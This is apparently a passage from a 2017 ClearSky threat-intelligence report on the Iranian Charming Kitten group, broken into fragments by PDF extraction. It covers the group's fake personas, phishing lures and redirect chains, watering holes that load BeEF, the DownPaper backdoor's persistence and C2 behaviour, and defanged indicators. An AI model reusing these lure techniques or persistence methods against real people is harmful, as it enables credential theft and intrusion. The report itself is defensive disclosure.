Dc\n \n(\nariadc\n[\n.\n]\ncom\n, \nariadc\n[\n.\n]\nnet\n)\n \nwhich \nwas registered by \naryaieiran@gmail.com\n \nfor three days \nin 2013 \nbefore changing to \na \ngeneric email\n16\n:\n \n \nARia Dc\n \nlater turned into \nM\nahan\nS\nerver, as can be seen in Waybac Machine:\n \n \n \n \n                                        \n                  \n \n16\n \nData from DomainTools whois history.\n \n  \nPage \n15\n \nof \n59\n \n\u00a9All rights reserved to \nClearSky Cyber Security\n, 2017\n \n \n \nTo sum up, the HBO hacker \n-\n \nBehzad Mesri\n \nis a member of Turk Black Hat along with \nArYaIeIrAn\n, who \nprovides \ninfrastruc\ntu\nre\n \nfor Charming Kitten \nactivity\n \nvia \nPersianDNS / Mahanserver \ntogether with\n \nMohammad Rasoul Akbari\n, who is \na \nFacebook friend\n \nof \nBehzad Mesri\n's\n.\n \nWe tend to identify \nArYaIeIrAn\n \nwit\nh\n \nMohammadamin Keshvari\n, because the latter is the only other employee of \nMahanserver\n \nand\n \nworks in a \ncompany \nwhose\n \ndomain was \nregistered \nby the \nformer\n \n(and both have a similar and unique profile picture)\n.\n \nW\ne \nestimate \nwith medium certainty \nthat \nthe three are directly connected to Charming Kitten, and \npotentially\n, along with others \n\n \nare\n \nCharming Kitten.\n \nWe used \nSocialNet\n\nM\naltego transform \nfor social media analysis\n17\n \nto \nanalyze\n \nthese \nconnection\ns\n \nand visually depict them\n, as can be \nseen below:\n \n \n \n \n \n \n                                        \n                  \n \n17\n \nhttps://shadowdragon.io/product/socialnet\n \n  \nPage \n16\n \nof \n59\n \n\u00a9All rights reserved to \nClearSky Cyber Security\n, 2017\n \n \n \nDelivery and Infection\n \nC\nharming Kitten\n \nattack their targets using the following methods:\n \n\n \nMade up \norganizations\n \nand people \n\n \nentities are made up \nto\n \nlure people into malicious websites\n \nor \nto receive malicious messages\n.\n \n \n\n \nImpersonating real \ncompanies\n \n\n \nreal companies are impersonat\ned, making victims believe they\n \nare \ncommunicating or visiting the website of the real companies. \n \n\n \nWatering hole attacks\n \n\n \ninserting malicious JavaScript code into breached strategic websites.\n \n\n \nS\npear phishing\n \n\n \npreten\nding to be\n \nGmail, Facebook, and other services providers, or pretending to \nbe a friend of the target sharing a file or a link.\n \nThese methods are elaborated below.\n \nMade up \norgani\nz\nations\n \nand people \n \nBritish News \n \nC\nharming kitten regularly target\n\ninternational media outlets with Persian\n-\nlanguage\n \nservices\n.\n \nTwo recent \nreports\n \n\n \n\"\nHow Iran tries to control news coverage by foreign\n-\nbased journalists\n\"\n18\n \nand \"\nIranian agents \n\n\"\n19\n \ndescribe harassment and intim\nidation methods \napplied by Iranian intelligence agencies. \nT\nhese campaigns\n \noften target\n \nr\neporters\n \nand \njournalists \nin\n \nphishing \nattempts.\n \nO\nn the same note, \nwe \nidentified a fake\n-\nnews agency \"established\" by the attackers\n, \ncalled \n\nThe British news \nagency\n\n \nor\n \n\nBritishnews\n\n \n(inspired by BBC)\n20\n. \nIts website \ndomain \nis \nbritishnews.com\n[\n.\n]\nco\n \nand two other \ndomains, \nbroadcastbritishnews\n[\n.\n]\ncom\n \nand \nbritishnews\n[\n.\n]\norg\n,\n \nredirected to it. \nBelow are screenshot\ns\n \nof the \nmain page of the website\n, which is online at time of writing\n:\n \n \n \n                                        \n                  \n \n18\n \nhttps://rsf\n.org/en/news/how\n-\niran\n-\ntries\n-\ncontrol\n-\nnews\n-\ncoverage\n-\nforeign\n-\nbased\n-\njournalists\n \n \n19\n \nhttp://www.arabnews.com/node/1195681/media\n \n \n20\n \n\nemmes Fatales, Iran's Spies Learn To Love \n\n\nforbes.com/sites/thomasbrewster/2017/07/27/iran\n-\nhackers\n-\noilrig\n-\nuse\n-\nfake\n-\npersonas\n-\non\n-\nfacebook\n-\nlinkedin\n-\nfor\n-\ncyberespionage\n \n \n  \nPage \n17\n \nof \n59\n \n\u00a9All rights reserved to \nClearSky Cyber Security\n, 2017\n \n \n \n\nf the fake news agency website, detailing its objectives and \n\n:\n  \n \n  \nPage \n18\n \nof \n59\n \n\u00a9All rights reserved to \nClearSky Cyber Security\n, 2017\n \n \n \n \n \n \n \nNote \nthe \nuse of present perfect instead of past simple in \"has been established\" (instead of \"was \nestablished\"), present progressive (we are covering) instead of present simple (we cover) \nto mark a habitual \naspect, \nand \"began this work\" \n\n \nall \nsuggesting a Persian\n-\nt\nhinking writer. \n \nThis fake news\n-\nagency and \naccompanying\n \nsocial media accounts \nare not\n \nused to disseminate propaganda or \nfalse information. Their content was automatically copied from legitimate sources. The purpose of this news \nagency is to create legitima\ncy, with the end goal of reaching out to their targets and infecting them while \nvisiting the infected website. \n \nThe website contains BeEF (Browser Exploitation Framework \n\n \na \npenetration testing tool that focuses on web \nbrowser\ns), however it seems that the \npayload is sent only when the victim visits the site from IPs in a \nwhitelist\n \nmanaged by the attackers\n. This\n \nmight \nindicate\n \nthey are after specific targets or organizations rather th\na\nn \nwidespread infection\n.\n \nThe screenshot \nbelow shows \nw3school.hopto\n[.]\norg\n, which served BeEF, called when \nbritishnews.com\n[\n.\n]\nco \nis \nloading\n:\n \n  \nPage \n19\n \nof \n59\n \n\u00a9All rights reserved to \nClearSky Cyber Security\n, 2017\n \n \n \n \n \n  \nPage \n20\n \nof \n59\n \n\u00a9All rights reserved to \nClearSky Cyber Security\n, 2017\n \n \n \nAt the bottom of the site are links to social media accounts created by the attackers: \n \nB\nelow are screenshots of the accounts.\n \nInstagram\n, \nInstagram[.]com/britishnewslive\n \nwith\n \nover \n13,000 followers\n \n(unavailable \nfor several \nmonths)\n:\n \n \n \n \n \n \n  \nPage \n21\n \nof \n59\n \n\u00a9All rights reserved to \nClearSky Cyber Security\n, 2017\n \n \n \nTwitter, \nhttps://\ntwitter[.]com/britishnewslive\n \n(online at time of writing)\n:\n \n \nFacebook page \n-\n \nfacebook[.]com/officialbritishnewslive\n \n(unavailable \nfor several \nmonths):\n \n \n \n \n  \nPage \n22\n \nof \n59\n \n\u00a9All rights reserved to \nClearSky Cyber Security\n, 2017\n \n \n \nLinkedIn \ncompany \npage\n,\n \nlinkedin[.]com/company/britishnews\n \n(unavailable \nfor several \nmonths)\n:\n \n \nThe attackers\n \nalso \ncreated \na fake LinkedIn profile\n, \nIsabella Carey\n,\n \nthat \n\nthe \nfake \nnews company: \n \nlinkedin[.]com/in/isabella\n-\ncarey\n-\n98a42a129\n \n(unavailable \nfor several \nmonths):\n \n  \nPage \n23\n \nof \n59\n \n\u00a9All rights reserved to \nClearSky Cyber Security\n, 2017\n \n \n \n \n \nAn e\nmail address with the same name, \nisabella.careyy@gmail.com\n, was used to register 12 malicious \ndomains by Charming Kitten, as can be seen in PassiveTotal\n21\n:\n \n \n                                        \n                  \n \n21\n \nhttps://community.riskiq.com/search/whois/email/isabella.careyy@gmail.com\n \n \n  \nPage \n24\n \nof \n59\n \n\u00a9All rights reserved to \nClearSky Cyber Security\n, 2017\n \n \n \nMade up studens \nand jurnalists\n \nMultiple Israeli \nIranist\n \nand middle east researchers were sent emails and Twitter direct messages by made up \nentities.\n \nThese entities are \nreviewed\n \nbelow.\n \nZehavit Yehuda\n \n \nOne \nof the \nfake \n\n \n\n, who sent the following phishing email:\n   \n \nThe email links to a website, \nhttps://sites.google[.]com/view/docs\n-\ndownloads\n, which \nwas built with \nGoogle \nSites\n:\n \n \n \n  \nPage \n25\n \nof \n59\n \n\u00a9All rights reserved to \nClearSky Cyber Security\n, 2017\n \n \n \nThe \nDownload\n \nbutton is a redirection link:\n \n \nhttp://www.google[.]com/url?q=http%3A%2F%2Fdownload\n-\ngoogle.com\n-\norginallinks.ga%2Fdownload%2Ffile%2Fusr%<redact\ned>&sa=D&sntz=1&usg=<redacted> \n \nW\nhich \nleads\n \nto a fake log\n-\nin page\n \nin a domain registered by the attackers\n:\n \n \nhttp://download\n-\ngoogle.com\n-\norginal\n-\nli\nnks[.]g\na/download/file/usr/<redacted> \n \n \nY\nafa\n \nH\nyat\n \nFake entity \"\nYafa Hyat\n\" (\n@yafa1985\nhyat\n,\n \nonline at time of writing\n)\n \nhas contacted an \nIsraeli Iranist via a direct message on twitter\n, pretending to be a \np\nolitical \nresearcher\n \nwho \nneeds help with an article\n:\n \n \n  \nPage \n26\n \nof \n59\n \n\u00a9All rights reserved to \nClearSky Cyber Security\n, 2017\n \n \n \n \nThe researcher was asked to read the article in her \"google account\", which was also a phishing page in Google \nsites: \nhttps://sites.google[.]com/site/yaffadocuments/\n \n:\n \n \n  \nPage \n27\n \nof \n59\n \n\u00a9All rights reserved to \nClearSky Cyber Security\n, 2017\n \n \n \nThe site a\nutomatically\n \nredirects to a phishing website\n \nhosted in a domain \nregistered\n \nby the attackers\n, \ndownload\n-\ngoogle.orginal\n-\nlinks[.\n]\ncom\n:\n \n \n\"Yafa\"\n \nalso\n \nsent an email \nfrom \nyaffa.hyatt9617@gmail.com\n \nto a university professor, asking \nto work at the \nuniversity center \nshe\n \nis \nheading\n. The email itself did not contain malicious \ncontent, and was likely sent to build \ntrust prior to sending a phishing link or malware:\n \n  \nPage \n28\n \nof \n59\n \n\u00a9All rights reserved to \nClearSky Cyber Security\n, 2017\n \n \n \n \nBahar Azadeh\n \nFake\n \nentity\n \n\"\nBahar Azadeh\n\" \n(\nbahra.azadeh88@gmail.com\n \nand\n \n@baharazadeh1\n22\n, \nonline at time of writing\n) \nsent email\ns\n \nwith different background stories \nto \nmultiple researchers\n.\n \nIn \ntwo \ncases,\n \nshe \nwas a \"Jewish girl \nwho has an Iranian origin and who has studied in the field of political science\":\n \n \n \n \n \n                                        \n                  \n \n22\n \nhttps://twitter.com/baharazadeh1\n \n \n  \nPage \n29\n \nof \n59\n \n\u00a9All rights reserved to \nClearSky Cyber Security\n, 2017\n \n \n \nYet in a third case she \nclaimed to be \nBaha'i living in Tehran\n:\n \n \nT\nranslat\nion\n\n \nHello,\n \nMr. Dr., I am a Bahai living in Tehran, if you can call it a life. As you know, the present situation in Iran for \nus Bahais is not good at all, so that we are even deprived of our natural right, that is, higher education, as \nif we Bahais are not human and \nhave no right to live. \n \n<redacted>\n, I have been accepted to universities all across Iran, and after two years of studying in a \nuniversity, they realized from certain \nsources\n \nthat I was Bahai, and expelled me. I did not sit idle and began \nto \nconstantly\n \nprotest, I've been summoned [to court] quite a few times for this thing, and I already feel \nIran has become a hell for me, and as much as I try I can't find salvation from this hell.\n \nOne of the reasons I've asked you for help and guidance was reading your\n \nbook (\n<redacted>\n), and your \nresearch in this field has been really valuable and \nhelpful, which made this book so beautiful.\n \n\"I have a few questions for you, please answer me\".\n \nT\n\nEmili\na Karter\n \n(\nonline at time of writing\n)\n:\n \n \n  \nPage \n30\n \nof \n59\n \n\u00a9All rights reserved to \nClearSky Cyber Security\n, 2017\n \n \n \n \nImpersonating \nreal companies \n \nUnited \nT\nechnologies impersonation\n \n \nThe \nattackers \ncreated \na website\n \nimpersonating \nUTC \n(\nUnited Technologies\n)\n, \n\nan American multinational \nconglomerate \nwhich \nresearches, develops and \nmanufactures products in numerous areas, including aircr\naft \nengines, \n[and] \n\n. \nUTC is a large military contractor, getting about 10% of its revenue \nfrom the U.S. government\n\n23\n.\n  \nThe fake\n \nwebsite was f\nirst reported by \nIran Threats\n \nresearch\ners\n \non \n6 February \n2017\n24\n. We do not have evidence that UTC was targeted or impacted.\n \nThe fake website, which was built \nin \n\n\n\n. \nIt was a decoy to make visitor \n\n \ni\nn\n \nfact \nDownPaper malware, analyzed later in this report.\n \n                                        \n                  \n \n23\n \nhttps://en.wikipedia.org/wiki/United_Technologies\n\n \n24\n \nhttps://iranthreats.github.io/resources/macdownloader\n-\nmacos\n-\nmalware/\n \n \n  \nPage \n31\n \nof \n59\n \n\u00a9All rights reserved to \nClearSky Cyber Security\n, 2017\n \n \n \n \nThe malware was served from the following location\n:\n \nhttp://login.radio\n-\nm[.]cf/utc/dnld.exe\n \nIt was contained in \na \nc\nabinet self\n-\nextractor that impersonates a legitimate Windows software: \n \ndnld.exe\n \nbe207941ce8a5e212be8dde83d05d38d\n \n3b4926014b9cc028d5fb9d47fee3dbd9376525dcb3b6e2173c5edb22494cfa9b\n \n \n  \nPage \n32\n \nof \n59\n \n\u00a9All rights reserved to \nClearSky Cyber Security\n, 2017\n \n \n \nWatering hole\ns\n \nThe attackers breached \nthe following \nwebsites \npertaining to \nIranian and Jewish cultural affairs\n:\n \nBreached website\n \nDescription \n \nhamijoo[.]com \n\n \nAn Iranian crowdfunding platform\n \nwww.jewishjournal[.]com\n \nA Jewish news site\n \nwww.estherk[.]com\n \nA personal blog of \none of JewishJournal's\n \nwriter\ns\n \nwww.boloogh[.]com\n \nA sex education \nwebsite \nfor Iranian youth \n \nlevazand\n[\n.\n]\ncom\n \nA personal blog of an Iranian living in United sates \n \nA\n \nscrip\nt\n \ntag that loads \nBeE\nF\n \nJavaScript from \nw3school.hopto\n[.]\norg\n \nor from \nbootstrap.serveftp[.]com\n \nwas \nadded\n, as can be seen in the images \nbelow:\n \n \n  \nPage \n33\n \nof \n59\n \n\u00a9All rights reserved to \nClearSky Cyber Security\n, 2017\n \n \n \n \n \n \n  \nPage \n34\n \nof \n59\n \n\u00a9All rights reserved to \nClearSky Cyber Security\n, 2017\n \n \n \nSpear Phishing\n \nfor credential stealing\n \nThe attackers sent hundreds, maybe \nthousands\n, of spear phishing emails to \nhundreds\n \nof targets. \nIn this \nsection,\n \nwe will present samples of spear phishing emails\n25\n.\n \nWave 1\n \nT\nhe attackers breached the Gmail account of Alon Gur Arye, an Israeli film producer. Alon \nproduced\n \na satire \nfilm\n \nabout the Israeli Mossad, which potentially confused the \nattackers\n \nto thinking he is \nassociated\n \nwith the \nIsraeli Mossad. \nThe breached account wa\ns used \nto \nsend a phishing email to \nThamar Eilam Gindin \n(who is \ntargeted \nby the group \nsince 2015\n26\n)\n.\n \nBelow is a screenshot \nof \nthe phishing email\n:\n \n \nThe email contained a \nshortened \nbit.ly link to a domain registered by the attackers \n-\n \ndrivers.document\n-\nsupport\nsharing\n[\n.\n]\nbid\n. In the statistics and usage page of the bit.ly URL we can see that the first click, likely a \ntest run performed by the attackers before sending the phish, \nwas \nfrom Iran\n.\n \n                                        \n                  \n \n25\n \nNames of victims and targets are shared with their permission.\n \n26\n \nSee \n, \nThamar Reservoir\n: \nhttp://www.clearskysec.com/thamar\n-\nreservoir/\n \n \n  \nPage \n35\n \nof \n59\n \n\u00a9All rights reserved to \nClearSky Cyber Security\n, 2017\n \n \n \n \nThe phishing page pretends to be a Gmail shared document downed page\n \nthat requires the visitor to log in:\n \n \n \n  \nPage \n36\n \nof \n59\n \n\u00a9All rights reserved to \nClearSky Cyber Security\n, 2017\n \n \n \nWave 2\n \nSometimes the phishing email does \nnot contain \nlive \ntext, but only \nan image of text\n \nlinked to a phishing page. \nThis is \nusually\n \ndone to \nbypass text based spam filters.\n \nT\nhe attackers \nused \nWebRTC \n(\ncode copied \nfrom Github\n27\n)\n \nto \ndetect \nthe real IP address of targets who use \nproxies\n \n(\nThis method\n \nwas documented by I\nran\n \nT\nhreats\n28\n)\n:\n \nWhile sending the\n \nspear\n \nphishing\n,\n \nthe attackers \npreformed password recovery\n \n\naccount\n, as can be seen below\n. \nThus, she received fake email\ns\n \nand\n \nlegitimate \nones at the same time which \ncould cause her confusion\n \nand subsequently to give her credentials in the phishing\n. \n \n \n                                        \n                  \n \n27\n\nhttps://github.com/diafygi/webrtc\n-\nips/blob/master/README.md\n \n\n \n28\n \nhttps://iranthreats.github.io/resources/webrtc\n-\ndeanonymization/\n \n \n  \nPage \n37\n \nof \n59\n \n\u00a9All rights reserved to \nClearSky Cyber Security\n, 2017\n \n \n \nWave 3\n \nT\nhe \nattackers\n \noften \nopen a\n \nnew\n \nGmail account and send phishing emails from it. For examp\nle, \nsuspended.user.noitification@gmail.com\n \nwas used to send the following email to \ntargets\n:\n \n \nWhich leads to:\n \n \n  \nPage \n38\n \nof \n59\n \n\u00a9All rights reserved to \nClearSky Cyber Security\n, 2017\n \n \n \n \nIn other \ncases\n,\n \n7 different targeted phishing emails were sent to the same victim on the same day \nfrom \ncustomers.mailservice@gmail.com\n:\n \n \n \n  \nPage \n39\n \nof \n59\n \n\u00a9All rights reserved to \nClearSky Cyber Security\n, 2017\n \n \n \n \n \n  \nPage \n40\n \nof \n59\n \n\u00a9All rights reserved to \nClearSky Cyber Security\n, 2017\n \n \n \n \nThe phishing messages were sent to hundreds of recipients from a previously unknown email address:  \nmails.customerservices@gmail.com\n \nThey contained a link to \ngoo\n-\ngle[.]mobi\n \nBelow are screen captures of two of the messages. The content is not copied \ndirectly from Googles original \nnotices, as evident from the spelling and grammatical errors\n, some of them typical of Persian speakers, e.g. \nusing direct speech where English would use indirect speech\n \n(\"that\" instead of \"whether\")\n:  \n \n \n  \nPage \n41\n \nof \n59\n \n\u00a9All rights reserved to \nClearSky Cyber Security\n, 2017\n \n \n \n \nH\named Hashemi\n, an \nI\nranian \nIndependent \nr\nesearcher and p\nhotographer \nliving\n \nin the \nNetherlands\n \nwas targeted\n \nin this campaign. He detected the malicious emails \nand \nwrote\n \nabout \nthem \nin his twitter account\n29\n \n30\n:\n \n \nTranslation: \n\nThe brothers'\n31\n \nnew method for hacking e\n-\nmail\ns\n. Do not be fooled by such \nan email\n\n.\n \n                                        \n                  \n \n29\n \nhttps://twitter.com/hamed_hashemi/status/86983507555\n0162944\n \n \n30\n \nhttps://twitter.com/hamed_hashemi/status/869865703939219456\n \n \n31\n \nI.e. people working for the IRI. \n \n  \nPage \n42\n \nof \n59\n \n\u00a9All rights reserved to \nClearSky Cyber Security\n, 2017\n \n \n \n \nTranslation: \n\n\n\n \nOther reported receiving \n\n \nspear phishing emails within a few minutes. For example, \nSoudeh Rad\n32\n \nb\noard \nm\nember \nat ILGAEurope\n33\n \n(\nan \norganization for huma\nn rights and equality for lesbian, gay, bisexual, trans and \nintersex people at European level)\n:\n \n \nTranslation:\n \n\nWhat's the most important thing to do when you're under a phishing attack? Keep your calm \n\n \n6 e\n-\nmails arrived within 10 minutes (saying) someone\n \nsigned into your email (account), confirm your \naccount.\n\n \n                                        \n                  \n \n32\n \nhttps://twitter.com/soudehrad/status/876062478685396992\n \n \n33\n \nhttps://twitter.com/ILGAEurope\n \n \n  \nPage \n43\n \nof \n59\n \n\u00a9All rights reserved to \nClearSky Cyber Security\n, 2017\n \n \n \n \nBehrang Tajdin\n34\n \na\n \nBBC Persian TV\n \nReporter\n \nsaid\n35\n \n36\n  \nhe was \ntargeted in a similar campaign in April 2017:\n \n \nTranslation: \n\nIf you \nget \nan email like this, don't fall for it and don't click. It's nothing but a \nuseless \nphishing \nattempt to hack your google and \nG\nmail account.\n\n \n                                        \n                  \n \n34\n \nhttps://twitter.com/Behrang\n \n \n35\n \nhttps://twitter.com/Behrang/status/855761991117484032\n \n \n \n  \nPage \n44\n \nof \n59\n \n\u00a9All rights reserved to \nClearSky Cyber Security\n, 2017\n \n \n \n \n \n \nTranslation: \n\nAnd if you click on the link but don't type your password, they send you another email. Don't fall \nfor \"if you wait you regret\"\n \n\n \n \n \n  \nPage \n45\n \nof \n59\n \n\u00a9All rights reserved to \nClearSky Cyber Security\n, 2017\n \n \n \nE\nmail tracking services\n \nThe \nattackers \noften use mailtrack.io to track when phishing emails are \nopened. These\n \nservices are \noften \nused \nby marketing\n \npeople \nto monitor \ntheir \ncampaign effectiveness\n. Below is the source code of a\n \nspear phishing \nemail\n \nwith \na \nmailtrack.io\n \ntracking\n \nlink\n:  \n \n \nSometimes \nthe attackers used a similar \nemail tracking \nservice\n,\n \nby \nPointofmail\n.\n \nIn this case, the malicious \nemail was sent from \nPointofmail\n\n \nservers\n \n(this is part of their \nservice\n, not due to a \nbreach)\n. The email\n \ncontained a \nredirect \nlink to \nlegitimate address \na\ndv\nm\nail\ns\nervice.com:\n \n \nWhich redirects\n \nseveral times\n,\n \neventually reach\ning\n \nthe malicious page:\n \n \n  \nPage \n46\n \nof \n59\n \n\u00a9All rights reserved to \nClearSky Cyber Security\n, 2017\n \n \n \n \nTargeted \nemails \nwith \nmalware\n \nEmail address \ncustomers\n.mailservice@gmail.com was mostly used for spear phishing. \nO\nccasionally\n,\n \nit \nwas\n \nused to deliver links to malware. \nFor example, the email below \nlinked to \nhttp://tinyurl[.]com/hjtaeak\n \nwhich \nredirected to \nhttp://login.radio\n-\nm[.\n\ncf/i/10\n-\nunique\n-\nchocolates\n-\nin\n-\nth\ne\n-\nworld.zip\n. The final URL \ncontained \nthe \nsame \nsample of DownPaper \nthat\n \nwas hosted in the fake UTC website mentioned above \n(be207941ce8a5e212be8dde83d05d38d)\n.\n \n \n\nin the malicious email \nwas indeed\n \na Facebook \nfriend of \nthe target\n \n(the target shared a link by her a few hours prior to receiving this message), and the \nsubject of chocolate was trending on the target's feed at the time. \nThe attackers spied on the target \n(potentially by following her on va\nrious social networks)\n, and \ncrafted an email she \nwould be \nlikely \nto \nreceive\n.\n \n  \nPage \n47\n \nof \n59\n \n\u00a9All rights reserved to \nClearSky Cyber Security\n, 2017\n \n \n \nDownPaper\n\nM\nalware\n \nDownPaper, \nsometimes \ndelivered as \nsami.exe\n,\n \nis a \nBackdoor\n \ntrojan\n.\n \nIts \nmain\n \nfunctionality is to download \nand run a second stage. \n \nThe sample used in our \nanalysis\n \n(3261d45051542ab3e54fa541f132f899)\n \nwas \ncontained in a Cabinet self\n-\nextractor \n(be207941ce8a5e212be8dde83d05d38d)\n,\n \nserved from \nthe \nfollowing \nURL\n:\n \nhttp://login.radio\n-\nm[.]cf/utc/dnld.exe\n \nThe \nprocess\n \ntree below shows\n \ndnld.exe\n \ndrops \nsami.exe\n \n(DownPaper)\n,\n \nwhich \nin turn \nruns\n \nPowershell\n \nto \ngain\n \npersistency\n: \n \n \nDownPaper \nperforms \nthe following steps\n:\n \n1.\n \nLoads \nfrom a resource file \na URL \nof a command and control\n \nserver\n.\n \nIn the \nsample\n \nwe \nanalyzed\n,\n \nthe URL was \n\nhttp://46.17.97[.]37/downloader/poster.php\n\nencoded as\n \ncan be seen below:\n \n \n2.\n \nSearches\n \nand read\ns\n \nthe value of \nWindow Update\n \nr\negistry \nk\ney in the following path: \nHKCU:\n\\\nSOFTWARE\n\\\nMicrosoft\n\\\nWindows\n\\\nCurrentVersion\n\\\nRun\n.\n \na.\n \nIf the value is \nNull\n, a new \nm\nutex is created, called \nGlobal\n\\\nUpdateCenter\n, and a \nm\nutex \nsynchronization function is executed.\n \nb.\n \nIf the value is different than the name of the running file, section 2.a. is executed and\n \na \nfunction \ncalled \nSetStartUp\n \nis called via \nPowerSh\nell \nto create a\n \nregistry \nkey \nnamed\n \nWindow Update\n \nwith the following value:\n \n  \nPage \n48\n \nof \n59\n \n\u00a9All rights reserved to \nClearSky Cyber Security\n, 2017\n \n \n \n$scriptRoot\n\nAppData\n\\\nLocal\n\\\nMicrosoft\n\\\nWindows\n\\\nwuauclt\n.exe\n \n \n \n3.\n \nSend\ns\n \nan \nHTTP P\nOST\n \nrequest\n \nto get \nthe location of \na second stage \nfrom\n \nthe command and control \nserver.\n \nThe \nrequests contain\n \nthe following fields:\n \na.\n \nInfected computer host \nname\n \nb.\n \nUsername\n \nc.\n \nSerial Number \n\n \nRetrieved via the following query: \nSELECT * FROM Win32_BaseBoard\n \n4.\n \nWhen a file is received, runs \nit in a\n \nnew thread.\n \n5.\n \nPause for ten \nseconds,\n \nthen \nrepeat step\n \n3.\n \n \nLocations\n \nC:\n\\\nUsers\n\\\nuser1\n\\\nAppData\n\\\nLocal\n\\\nTemp\n\\\nIXP000.TMP\n\\\nsami.exe\n \nC:\n\\\nUsers\n\\\nuser1\n\\\nAppData\n\\\nLocal\n\\\nMicrosoft\n\\\nWindows\n\\\nwuauclt.exe\n \nAssembly Details:\n \n \nPDB \npath:\n \nd:\n\\\nTask\n\\\nD\n\\\nTask\n\\\nFUD\n\\\nDownPaper\n\\\ntrunk\n\\\nDownloader\n\\\nobj\n\\\nDebug\n\\\nwuauclt.pdb\n \n  \nPage \n49\n \nof \n59\n \n\u00a9All rights reserved to \nClearSky Cyber Security\n, 2017\n \n \n \nAdditional samples \n \nwuauclt.exe\n \nd\n6ea39e1d4aaa8c977a835e72d0975e3\n \nmsoffice\n-\nupdate[.]com\n \n93.158.215.50 \n \nhttp://msoffice\n-\nupdate[.]com/gallery/help.php\n \nC:\n\\\nUsers\n\\\nuser1\n\\\nAppData\n\\\nLocal\n\\\nTemp\n\\\nIXP000.TMP\n\\\nsami.exe\n \nkey: HKEY_CURRENT_USER\n\\\nSoftware\n\\\nMicrosoft\n\\\nWindows\n\\\nCurrentVersion\n\\\nRun\n\\\nWindow Update\n \ndata: \nC:\n\\\nUsers\n\\\nuser1\n\\\nAppData\n\\\nLocal\n\\\nMicrosoft\n\\\nWindows\n\\\nwuauclt.exe\n \n10 unique chocolates in the world.exe\n \nbe207941ce8a5e212be8dde83d05d38d\n \n3b4926014b9cc028d5fb9d47fee3dbd9376525dcb3b6e2173c5edb22494cfa9b\n \nsami.exe\n \n3261d45051542ab3e54fa541f132f899\n \n479e1e02d379ad6c3c7f496d705448fa955b50a1\n \nC:\n\\\nUsers\n\\\nuser1\n\\\nAppData\n\\\nLocal\n\\\nTemp\n\\\nIXP000.TMP\n\\\nsami.exe\n \nC:\n\\\nUsers\n\\\nuser1\n\\\nAppData\n\\\nLocal\n\\\nMicrosoft\n\\\nWindows\n\\\nwuauclt.exe\n \n \n20f2da7b0c482ab6a78e9bd65a1a3a92\n \nhttp://msoffice\n-\nupdate\n[\n.\n]\ncom/gallery/help.php\n \nd:\n\\\nTask\n\\\nD\n\\\nTask\n\\\nFUD\n\\\nDownPaper\n\\\ntrunk\n\\\nD\nownloader\n\\\nobj\n\\\nDebug\n\\\nwuauclt.pdb\n \nax haye ayin.exe\n \n276befa70cff36860cd97e3e19f10343\n \n753b73b82ec8307f54cfb80091600fb283476aa6df7102d6af82048ef4a5913f\n \n5.79.69\n[\n.\n]\n206:4455\n \n \npita.exe\n \n60753796905458fa6a4407f48309aa25\n \n53f7b95262971d79e676055d239180d653fd838dc6ffb9a3418ccad2b66c54bc\n \nC:\n\\\nUsers\n\\\nuser1\n\\\nAppData\n\\\nLocal\n\\\nTemp\n\\\nIXP000.TMP\n\\\npita.exe\n \naziii.exe\n \n3c01793380fbd3f101603af68e96f058\n \n13ac10cd2595fb8fefd4e15c1b82bd2c8e1953809f0d1c349641997aeb9f935c\n \nAzita Gallery.exe\n \n30124b5c56cecf2045abd24011bdf06b\n \n9aa7fc0835e75cbf7aadde824c484d7dc53fdc308a706c9645878bbd6f5d3ad8\n \n \n \n \n  \nPage \n50\n \nof \n59\n \n\u00a9All rights reserved to \nClearSky Cyber Security\n, 2017\n \n \n \nMAGICHOUND.RETRIEVER\n \nBy pivoting off the malicious infrastructure we fou\nnd a sample of \nMAGICHOUND.RETRIEVER\n, a malware \nwhich is covered in a report by \nPalo Alto Networks\n \nabout \na group they call \nMagic Hound\n37\n. \nThe report says \nthat Magic Hound\n\n\nhas primarily targeted organizations in the energy, government, and technology sectors\n \nthat are either based or have business interests in Saudi Arabia\n\n,\n \n\nLink analysis of infrastructure and \ntools \n\nrevealed a potential relationship between Magic Hound and the advers\n\nKitten\n\n. \n \nThe la\nst\n \nnotion i\ns\n \nin line\n \nwith\n \nour findings\n.\n \nMAGICHOUND.RETRIEVER\n \nis a .NET downloader that retrieves secondary payloads using an embedded URL \nin its configuration as the C2\n.\n \nBelow is the sample that we found.\n \nflashplayer.exe\n \n9d0e761f3803889dc83c180901dc7b22\n \necf9b7283fda023fa37ad7fdb15be4eadded4e06\n \nd4375a22c0f3fb36ab788c0a9d6e0479bd19f48349f6e192b10d83047a74c9d7\n \nhttp://update\n-\nmicrosoft\n[\n.\n]\nbid/img/WebService.asmx\n \nhttp://update\n-\ndriversonline\n[\n.\n]\nbid/img/WebService.asmx\n \nThe \nconnections between the \nsample and \nCharmin\n\n \n \n                                        \n                  \n \n37\n \nhttps://res\nearchcenter.paloaltonetworks.com/2017/02/unit42\n-\nmagic\n-\nhound\n-\ncampaign\n-\nattacks\n-\nsaudi\n-\ntargets/\n \n \n  \nPage \n51\n \nof \n59\n \n\u00a9All rights reserved to \nClearSky Cyber Security\n, 2017\n \n \n \nAppendix \nA \n-\n \nIndicators of Compromise\n \n012mail\n-\nnet\n-\nuwclogin[.]ml\n \n443[.]tcp[.]shorturlbot[.]club\n \n874511478[.]account\n-\nlogin[.]net\n \n8ghefkwdvbfdsg3asdf1[.]com\n \naccount\n-\ncustomerservice[.]com\n \naccount\n-\ndropbox[.]net\n \naccount\n-\ngoogle[.]co\n \naccount\n-\nlogin[.]net\n \naccount\n-\nlogins[.]com\n \naccount\n-\nlog\n-\nuser\n-\nverify\n-\nmail[.]com\n \naccount\n-\npermission\n-\nmail\n-\nuser[.]com\n \naccounts[.]account\n-\ngoogle[.]co\n \naccounts[.]activities[.]devices[.]com[.]accounts[.]a\nctivities[.]devices[.]com[.]usersettings[.]cf\n \naccounts[.]activities[.]devices[.]co\nm[.]accounts[.]g\noogle[.]com[.]usersettings[.]cf\n \naccounts[.]activities[.]devices[.]com[.]drive[.]goog\nle[.]com[.]usersettings[.]cf\n \naccounts[.]activities[.]devices[.]com[.]usersettings\n[.]cf\n \naccounts[.]google[.]com[.]accounts[.]activities[.]d\nevices[.]com[.]use\nrsettings[.]cf\n \naccounts[.]google[.]com[.]accounts[.]google[.]com\n[.]usersettings[.]cf\n \naccounts[.]google[.]com[.]drive[.]google[.]com[.]u\nsersettings[.]cf\n \naccounts[.]google[.]com[.]usersettings[.]cf\n \naccountservice[.]support\n \naccount\n-\nservicerecovery[.]com\n 